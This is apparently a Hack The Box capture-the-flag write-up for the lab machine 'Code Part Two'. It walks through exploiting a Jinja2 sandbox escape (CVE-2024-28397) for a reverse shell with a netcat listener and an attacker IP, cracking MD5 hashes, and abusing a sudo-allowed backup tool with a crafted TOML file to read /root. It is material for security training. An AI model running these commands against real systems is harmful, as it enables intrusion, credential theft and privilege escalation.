# HTB Writeup: Code Part Two

## Machine Information

| Field | Details |
|-------|---------|
| Name | Code Part Two |
| IP | 10.10.11.239 |
| OS | Linux (Debian) |
| Difficulty | Easy |

## Summary

Code Part Two involves enumerating a Python web application running on port 8000, 
discovering a vulnerable dependency (jinja2 <= 3.1.4), exploiting CVE-2024-28397 to 
achieve a reverse shell, cracking MD5 password hashes from a local database to pivot to 
a user account, and abusing a misconfigured sudo rule on a backup CLI tool to read the 
root flag.

**Attack Chain:** CVE Exploitation → Hash Cracking → Sudo Abuse

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -p- codetwo.htb -oN codetwo_nmap
```

Open ports:
- **22/tcp** — OpenSSH 8.2p1
- **8000/tcp** — Gunicorn (Python web application)

### Web Application (Port 8000)

Navigated to the web application and found a Download App option on the landing page. 
Downloaded the source code as a zip archive and reviewed the contents.

Key files of interest:
- `app/requirements.txt` — application dependency list
- `app/database.db` — SQLite database

Reviewed `requirements.txt` and identified jinja2==3.1.2 as a dependency. Researching 
this version revealed CVE-2024-28397 — a sandbox escape vulnerability affecting jinja2 
versions below 3.1.4.

---

## Initial Access

### CVE-2024-28397 — Jinja2 Sandbox Escape

CVE-2024-28397 is a publicly documented proof of concept exploit targeting the 
`run_code` endpoint. Located the vulnerable endpoint and set up a netcat listener:

```bash
# Start listener on attack machine first
nc -lvnp 4444
```

Then executed the exploit:

```bash
git clone https://github.com/[CVE-2024-28397-PoC]
cd cve-2024-28397
python3 exploit.py --target http://10.10.11.239:8000 --lhost 10.10.14.148 --lport 4444
```

Successfully received a reverse shell as user `app`.

---

## Lateral Movement

### Hash Cracking

Located the SQLite database in the `app/database.db` directory and extracted user 
records, which contained MD5 password hashes:

```
[redacted hash 1]
[redacted hash 2]
```

Cracked the hashes using hashcat. Verify the correct mode for your hash format using 
`hashcat --identify` against the hash before running:

```bash
hashcat -m [mode] hashes.txt /usr/share/wordlists/rockyou.txt
```

Results:
- `[hash]` = `newtestingpayload` — confirmed not useful
- `[hash]` = `[password]` — confirmed valid

Retrieved the user flag after pivoting with the cracked credentials.

---

## Privilege Escalation

### Sudo Abuse — backup-cli

Checked sudo permissions:

```bash
sudo -l
```

Output showed `backup-cli` could be run as root with no password required. Reviewed the 
existing backup configuration to understand the tool behavior:

```toml
[server]
bind_address = "0.0.0.0"
port = 8080

[backups]
locations = ["/opt/app/templates"]
```

The backup tool accepted a custom TOML configuration file defining what to back up. 
By pointing the locations field at `/root`, the tool could be abused to read the root 
flag directory:

```toml
[server]
bind_address = "0.0.0.0"
port = 8080

[backups]
locations = ["/root"]
```

```bash
sudo /usr/bin/backup-cli /tmp/evil.toml
```

Retrieved the root flag from the backup output.

---

## Key Takeaways

- Vulnerable application dependencies for known CVEs — outdated packages are a common 
and easily exploitable attack vector. Always pin dependencies to patched versions and 
monitor for new CVEs against your dependency tree
- MD5 is a weak hashing algorithm — passwords stored as unsalted MD5 hashes are trivially 
crackable with common wordlists. Use bcrypt, scrypt, or Argon2 for password storage
- Sudo rules that allow commands to run without a password and with file read capabilities 
should be treated as critical misconfigurations. Always audit sudo permissions with 
`sudo -l` during post-exploitation enumeration

---

## Tools Used

- Nmap
- Gobuster
- SQLite
- Hashcat
- Netcat

---

## References

- [CVE-2024-28397](https://nvd.nist.gov/vuln/detail/CVE-2024-28397)
- [MITRE ATT&CK - T1190: Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK - T1552.001: Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)
- [MITRE ATT&CK - T1068: Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
